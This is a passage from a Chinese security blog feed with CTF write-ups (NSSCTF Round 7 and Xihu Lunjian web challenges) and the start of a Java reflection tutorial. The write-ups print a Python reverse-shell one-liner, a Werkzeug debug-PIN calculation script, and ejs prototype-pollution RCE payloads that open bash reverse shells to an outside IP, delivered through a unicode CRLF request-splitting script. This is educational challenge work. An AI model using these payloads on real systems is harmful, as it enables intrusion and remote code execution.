class="line">    <span class="keyword">global</span> tag</span><br><span class="line">    <span class="keyword">if</span> tag != <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">global</span> flag1</span><br><span class="line">        <span class="keyword">del</span> flag1</span><br><span class="line">        tag = <span class="literal">True</span></span><br><span class="line">    os.system(<span class="string">&quot;rm -f /tmp/flag1.txt /tmp/flag2.txt&quot;</span>)</span><br><span class="line">    action = request.form[<span class="string">&quot;act&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> action.find(<span class="string">&quot; &quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Nonono&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        os.system(action)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Wow&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error_date</span>(<span class="params">error</span>):</span><br><span class="line">    sleep(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;扫扫扫，扫啥东方明珠呢[怒]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>可能有师傅会头疼这个缩进问题，其实游览器右键查看源代码就有缩进好的，不需要我们再弄了。看代码，最后我们能利用的地方就是os.system函数，直接传ls执行下命令，无回显。既然无回显就反弹一下shell吧，利用nc，bash都没用，无奈，网上翻看wp，直接找到出题人的wp了。<a href="https://github.com/Randark-JMT/NSSCTF-Round_v7-ShadowFlag#nssctf-round7-shadowflag">GitHub - Randark-JMT&#x2F;NSSCTF-Round_v7-ShadowFlag</a></p><p>这里要用到python的反弹shell，师傅的视频中也讲过本题是基于python3.10基础镜像，是没有nc，curl等工具的。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;a=__import__;s=a(&quot;socket&quot;).socket;o=a(&quot;os&quot;).dup2;p=a(&quot;pty&quot;).spawn;c=s();c.connect((&quot;xx.xx.xx.x&quot;,2400));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(&quot;/bin/sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>在代码中过滤了空格，在linux中我们可以用%09代替空格，开启监听，成功反弹shell。</p><img src="/2023/02/05/NSSCTF-Round-7-web/5.png" class><p>在我们访问路由的时候，它会把flag1和flag2的txt文件以及flag1变量删除，怎么找到flag1，看这行代码：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">flag1 = <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br></pre></td></tr></table></figure><p>此文件读取没有用close关闭，打开了一个进程没有关闭，即使内容被删除，在进程中还是有缓存的。这就要考察到proc文件系统。</p><blockquote><p>打开一个文件就会创建一个进程，就会返回一个文件描述符，而这个文件描述符就指向这个打开的文件。很巧的是这题打开了flag1.txt却没有关闭，我们可以通过文件描述符来获取到被删除文件的内容。linux的&#x2F;proc目录是一个伪文件系统，linux一切皆文件，linux常见的进程也要变成文件存储在&#x2F;proc目录下。在&#x2F;proc目录下有很多以数字为名字的文件夹，就是进程运行时对应的进程号，而在这些文件夹下有一个fd文件夹，用于存放这个进程所拥有的文件描述符</p></blockquote><p>通过读取当前进程的文件描述符可以获取flag的内容，</p><img src="/2023/02/05/NSSCTF-Round-7-web/6.png" class><p>成功获得一部分flag。很可惜的是flag2关闭了进程，但是flag2变量仍然存在当前运行代码的堆栈中。其思路就是对其运行代码进行调试获取flag2。在shell路由下只post接收act参数，传入一个未知参数使其报错。</p><img src="/2023/02/05/NSSCTF-Round-7-web/7.png" class><p>开启了dubug调试页面，接下来就是算pin了。利用最新的算pin脚本，参考资料：<a href="https://blog.csdn.net/qq_42303523/article/details/124232532">flask的pin码攻击——新版本下pin码的生成方式</a>，接下来就在shell中读取相关信息：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username:ctf</span><br><span class="line">modname:flask.app(默认)</span><br><span class="line">appname:Flask(默认)</span><br><span class="line">文件绝对路径:/usr/local/lib/python3.10/site-packages/flask/app.py</span><br><span class="line">moddir:02:42:ac:02:9a:78       #/sys/class/net/eth0/address</span><br><span class="line">machine_id:由于docker机没有/etc/machine-id，读取/proc/sys/kernel/random/boot_id和/proc/self/cgroup</span><br><span class="line">/proc/sys/kernel/random/boot_id:e2a9f272-7959-44cc-86ce-6cfd758857a7</span><br><span class="line">/proc/self/cgroup:9d61b3c56d575b4aa612ade3cbbee9cfd3b0ea6b9e89b322a422cd672373044c</span><br></pre></td></tr></table></figure><img src="/2023/02/05/NSSCTF-Round-7-web/8.png" class><p>就利用上面博客的py脚本，将读取的信息进行替换，得到如下脚本：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;ctf&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.10/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="built_in">str</span>(<span class="built_in">int</span>(<span class="string">&quot;02:42:ac:02:9a:78&quot;</span>.replace(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;&quot;</span>),<span class="number">16</span>)),<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&quot;e2a9f272-7959-44cc-86ce-6cfd758857a7&quot;</span>+<span class="string">&quot;9d61b3c56d575b4aa612ade3cbbee9cfd3b0ea6b9e89b322a422cd672373044c&quot;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line"><span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">    num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line"><span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line"><span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>运行算出pin，开启debug调试模式，调试flag2，得到另一半flag值。</p><img src="/2023/02/05/NSSCTF-Round-7-web/10.png" class><p>拼接得到完整flag。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>还有最后一道题就是考察tarfile文件覆盖漏洞，比较老的CVE了。偷个懒，不想花时间复现了。</p>]]></content>
      
      
      <categories>
          
          <category> 赛题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pin码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022西湖论剑部分web复现</title>
      <link href="/2023/02/04/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/02/04/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第一次参加西湖论剑大赛，全程坐牢了。看着题目被其他师傅日穿，心里不甘啊，没办法，还是太菜，趁着还有比赛环境，抓紧复现一波赛题，详细记录一下。</p><h2 id="Node-Magical-Login"><a href="#Node-Magical-Login" class="headerlink" title="Node Magical Login"></a>Node Magical Login</h2><p>这题有附件，node.js代码，不过代码很好懂。主页面是个登录框。</p><img src="/2023/02/04/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/1.png" class><p>看源码分析功能，</p><img src="/2023/02/04/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/2.png" class><p>密码设置随机数，按常理不可能登录成功。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">user</span> === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag1&quot;</span>, flag1.<span class="title function_">toString</span>().<span class="title function_">trim</span>())</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;You Got One Part Of Flag! Try To Get Another Part of Flag!&quot;</span>)</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>伪造cookie可得flag1，</p><img src="/2023/02/04/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/3.png" class><p>关键在于flag2，输入正确的检测码，但是被toLowerCase()函数强制转小写。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(checkcode.<span class="property">length</span> === <span class="number">16</span>)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            checkcode = checkcode.<span class="title function_">toLowerCase</span>()</span><br><span class="line">            <span class="keyword">if</span>(checkcode !== <span class="string">&quot;aGr5AtSp55dRacer&quot;</span>)&#123;</span><br><span class="line">                res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Invalid Checkcode1:&quot;</span> + checkcode&#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;You Got Another Part Of Flag: &quot;</span> + flag2.<span class="title function_">toString</span>().<span class="title function_">trim</span>()&#125;)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>当时一直在想怎么绕过toLowerCase()函数，利用相似unicode编码字符也不行，最后改变思路，让toLowerCase()函数发生报错，跳转到catch捕捉，就会顺利执行下面的代码，获得flag2。可到最后也没能让toLowerCase()函数报错。看了师傅的wp才知道toLowerCase()函数是处理字符串的，我们给他传递一个数组，数据类型不匹配而出现异常。另外，我们传递的参数需要满足16长度，所以payload为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;checkcode&quot;:[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]&#125;</span><br></pre></td></tr></table></figure><img src="/2023/02/04/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/4.png" class><p>拼接得到完整flag。</p><h2 id="扭转乾坤"><a href="#扭转乾坤" class="headerlink" title="扭转乾坤"></a>扭转乾坤</h2><p>打开网站有个上传功能</p><img src="/2023/02/04/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/5.png" class><p>看到Servlet就知道后端是java有些劝退了。看wp才知道一个大小写绕过就能得到flag。随便上传什么文件，将文件类型的multipart&#x2F;form-data，改成大写，然后上传成功即可得到flag。</p><img src="/2023/02/04/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/6.png" class><p>有点不太理解，但是题目也给了提示：需要从RFC规范差异绕过waf。网上找了篇文章，以后填坑再看：<a href="https://www.anquanke.com/post/id/241265">https://www.anquanke.com/post/id/241265</a></p><h2 id="real-ez-node"><a href="#real-ez-node" class="headerlink" title="real_ez_node"></a>real_ez_node</h2><p>又是node.js题，相关知识点：</p><blockquote><p>safeobj.expand()原型链污染配合ejs模板rce。</p><p>ssrf配合unicode字符损坏构造恶意http数据包访问内网</p></blockquote><p>下载附件分析源码。在views中有两个ejs模板文件，在routes的index.js会对其进行渲染。</p><img src="/2023/02/04/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/7.png" class><p>这里的safeobj.expand()函数存在原型链污染，我们传入的req.body[index]值会覆盖掉index属性，在这里，需要污染的对象可控，污染的内容可控，因此存在漏洞点。相关CVE：<a href="https://nvd.nist.gov/vuln/detail/CVE-2021-25928">NVD - CVE-2021-25928 (nist.gov)</a>在网上找了个poc测试一下，（相关链接：<a href="https://www.freebuf.com/articles/web/275619.html">JavaScript原型链污染原理及相关CVE漏洞剖析 - FreeBuf网络安全行业门户</a>）</p><img src="/2023/02/04/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/8.png" class><p>污染成功，此处存在原型链污染。配合ejs模板引擎渲染，可以达到rce的目的。ejs模板注入的payload有很多，例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/6666 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>但是结合safeobj.expend函数，需要变通一下，另外__proto__关键词被过滤了。在网上搜索可以使用构造器配合prototype来代替__proto__，根据上面举的例子照葫芦画瓢，执行反弹shell，整合payload为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;constructor.prototype.outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1\\&quot;&#x27;);var __tmp2&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么有个问题，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">为什么不是这样：&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;outputFunctionName&quot;:</span><br><span class="line">而是这样写：&#123;&quot;constructor.prototype.outputFunctionName&quot;：</span><br></pre></td></tr></table></figure><p>都是safeobj.expend()函数搞的鬼，进入函数底层代码看看</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">expand</span>: <span class="keyword">function</span> (<span class="params">obj, path, thing</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!path || <span class="keyword">typeof</span> thing === <span class="string">&#x27;undefined&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      obj = <span class="title function_">isObject</span>(obj) &amp;&amp; obj !== <span class="literal">null</span> ? obj : &#123;&#125;;</span><br><span class="line">      <span class="keyword">var</span> props = path.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (props.<span class="property">length</span> === <span class="number">1</span>) &#123;</span><br><span class="line">        obj[props.<span class="title function_">shift</span>()] = thing;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> prop = props.<span class="title function_">shift</span>();</span><br><span class="line">        <span class="keyword">if</span> (!(prop <span class="keyword">in</span> obj)) &#123;</span><br><span class="line">          obj[prop] = &#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        _safe.<span class="title function_">expand</span>(obj[prop], props.<span class="title function_">join</span>(<span class="string">&#x27;.&#x27;</span>), thing);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p>上面写的由path参数接收。在这里它会被.分割成字符串数组。进入到else分支继续调用expend函数，相当于递归copy操作。在copy路由下，只能本地访问。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!ip.<span class="title function_">includes</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>)) &#123;</span><br><span class="line">    obj.<span class="property">msg</span>=<span class="string">&quot;only for admin&quot;</span></span><br><span class="line">    res.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj));</span><br><span class="line">    <span class="keyword">return</span> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续看代码，curl路由，</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> q = req.<span class="property">query</span>.<span class="property">q</span>;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">&#x27;http://localhost:3000/?q=&#x27;</span> + q</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.<span class="title function_">get</span>(url,<span class="function">(<span class="params">res1</span>)=&gt;</span>&#123;</span><br><span class="line">                    <span class="keyword">const</span> &#123; statusCode &#125; = res1;</span><br><span class="line">                    <span class="keyword">const</span> contentType = res1.<span class="property">headers</span>[<span class="string">&#x27;content-type&#x27;</span>];</span><br></pre></td></tr></table></figure><p>声明一个q属性，并且拼接到本机地址访问内网。那么我们应该可以拼接另一个恶意的http数据包来带着恶意的payload去访问copy路由。拼接数据包自然少不了CRLF，而针对于node的8.1.2版本（也就是题目环境）有unicode字符损坏造成的htttp拆分攻击漏洞。之前做过一道类似的题，在此继续啰嗦几句。</p><blockquote><p>在node.js中，并不能直接注入CRLF，node.js中的http库会检测用户如果含有回车换行会直接报错。js也是默认支持unicode字符串，只支持单字节字符集，如果传入高字节的unicode编码，则会被截断为单字节。我们可以巧妙的利用某些高字节unicode编码，让它截断为我们想要的换行。</p><p>举个栗子：如果我们传入\u010D\u010A，截断之后就变成了\u0D\u0A，就变成了CRLF。</p></blockquote><p>这题主要思路：curl路由存在ssrf-&gt;配合CRLF构造恶意http数据包访问copy路由-&gt;safeobj.expend()存在原型链污染-&gt;配合ejs模板渲染反弹shell.</p><p>接着就是写python脚本发包了，直接用[GYCTF2020]Node Game的脚本改改就好了。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">payloads = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /copy HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (windows11) Firefox/109.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Cookie: wp-settings-time-1=1670345808</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Content-Type: application/json</span></span><br><span class="line"><span class="string">Content-Length: 181</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&quot;constructor.prototype.outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/1.116.160.155/2400 0&gt;&amp;1\\&quot;&#x27;);var __tmp2&quot;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET / HTTP/1.1</span></span><br><span class="line"><span class="string">test:&#x27;&#x27;&#x27;</span>.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload_encode</span>(<span class="params">raw</span>):</span><br><span class="line">    ret = <span class="string">u&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> raw:</span><br><span class="line">        ret += <span class="built_in">chr</span>(<span class="number">0x0100</span> + <span class="built_in">ord</span>(i))</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">payloads = payload_encode(payloads)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payloads)</span><br><span class="line">r = requests.get(<span class="string">&#x27;http://3000.endpoint-f4a41261f41142dfb14d60dc0361f7bc.ins.cloud.dasctf.com:81/curl?q=&#x27;</span> + urllib.parse.quote(payloads))</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>发包反弹成功，获得flag。</p><img src="/2023/02/04/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/9.png" class><p>在这里贴上各种模板的原型链rce文章：<a href="https://www.anquanke.com/post/id/248170#h2-8">https://www.anquanke.com/post/id/248170#h2-8</a></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>剩下的web题目可能不在我的知识理解范围之内，等以后有机会继续补充记录。相关链接：<a href="http://syunaht.com/p/2990775804.html#toc-heading-6">http://syunaht.com/p/2990775804.html#toc-heading-6</a></p>]]></content>
      
      
      <categories>
          
          <category> 赛题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 原型链污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反射机制学习</title>
      <link href="/2023/02/01/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"/>
      <url>/2023/02/01/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="java反射"><a href="#java反射" class="headerlink" title="java反射"></a>java反射</h2><blockquote><p>java反射机制在运行状态中，对于任意一个实体类，都能够知道这个类的所有属性和方法；</p><p>对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能称为java语言的反射机制。</p></blockquote><p>java是一门静态语言，反射这一特性使其java有了动态性。这么说可能体会不到，那么就与javascript动态语言做个对比。看这么一小段javascript代码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> name = <span class="string">&quot;var a =2;var b = 3;alert(a+b)&quot;</span>;</span><br><span class="line">    <span class="built_in">eval</span>(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在代码运行过程中，eval函数能够访问到name的值，使其将字符串变成可执行的代码并执行，变量的自身结构发生变化，这就是语言的动态性。在加载完类之后，会生成class源文件，JVM启动后，会动态加载class文件，并将所有对象实例存放在堆中，将类型信息存放到方法区中。同时对象实例会保存指向类型信息的指针。也就是说，一个对象包含了完整的类的结构信息。反射就是通过一个类的实例能够知道该类的所有信息。</p><p>关于反射机制的相关类就在如下包</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.lang.reflect.*;</span><br></pre></td></tr></table></figure><h3 id="获取class类型的方式"><a href="#获取class类型的方式" class="headerlink" title="获取class类型的方式"></a>获取class类型的方式</h3><table><thead><tr><th>方式</th><th>备注</th></tr></thead><tbody><tr><td>Class.forName(“完整类名带包名”)</td><td>静态方法</td></tr><tr><td>对象.getClass()</td><td></td></tr><tr><td>任何类型.class</td><td></td></tr></tbody></table><p>写个例子</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Reflection;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.atomic.AtomicReference;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">dog</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">cat</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">cat</span>();</span><br><span class="line">        <span class="comment">//通过getClass获取类的Class对象</span></span><br><span class="line">        Class&lt;?&gt; c2 = a.getClass();</span><br><span class="line">        System.out.println(c2);</span><br><span class="line">        <span class="comment">//通过反射获取类的class对象</span></span><br><span class="line">        Class&lt;?&gt; c1;</span><br><span class="line">        c1 = Class.forName(<span class="string">&quot;com.Reflection.cat&quot;</span>);</span><br><span class="line">        System.out.println(c1);</span><br><span class="line">        <span class="comment">//通过类名.class获取类的class对象</span></span><br><span class="line">        System.out.println(cat.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cat</span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看运行结果他们获得的都是同一个class对象。</p><img src="/2023/02/01/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/1.png" class><p>注意类对象应该指类的Class对象,也就是字节码对象，每个类都有属于它自己的类对象。</p><h3 id="类加载内存分析"><a href="#类加载内存分析" class="headerlink" title="类加载内存分析"></a>类加载内存分析</h3><blockquote><p>加载：代码运行生成的class文件字节码内容加载到内存中，并将这些数据转换成方法区中的运行时数据（静态变量、静态代码块、常量池等），在堆中生成一个Class类对象代表这个类。</p><p>链接：将java类的二进制代码合并到jvm中。确保加载的类信息符合JVM规范，没有安全方面的问题–验证。正式为类变量(static变量)分配内存并设置类变量初始值–准备。虚拟机常量池内的符号引用替换为直接引用–解析</p><p>初始化：初始化阶段是执行类构造器<clinit>()方法的过程。类构造器<clinit>()方法是由编译器自动收集类中的所有类变量的<strong>赋值</strong>动作和**静态语句块(static块)**中的语句合并产生的。当初始化一个类的时候，如果发现其父类还没有进行过初始化、则需要先初始化其父类。虚拟机会保证一个类的<clinit>()方法在多线程环境中被正确加锁和同步。</clinit></clinit></clinit></p></blockquote><p>写个例子</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testcat</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">A</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">        System.out.println(A.m);</span><br><span class="line">        <span class="comment">/*加载到内存会产生一个类对应的class对象（加载）</span></span><br><span class="line"><span class="comment">          对m赋值默认初始值为0（链接）</span></span><br><span class="line"><span class="comment">          执行加载类中的代码（初始化）</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    &#125;</span><br><span 